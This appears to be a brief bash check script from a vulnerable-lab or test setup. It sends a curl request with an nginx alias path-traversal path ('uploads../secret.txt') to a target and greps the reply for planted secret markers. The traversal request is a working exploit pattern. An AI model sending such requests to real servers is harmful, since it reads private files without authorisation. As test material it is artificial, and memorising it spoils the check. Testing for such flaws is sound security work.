#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
body=$(curl -s --path-as-is "$TARGET/uploads../secret.txt")
grep -Eq 'NGINX-ALIAS-TRAVERSAL-SECRET|NESTJS-ATTACHMENT-SECRET' <<<"$body"
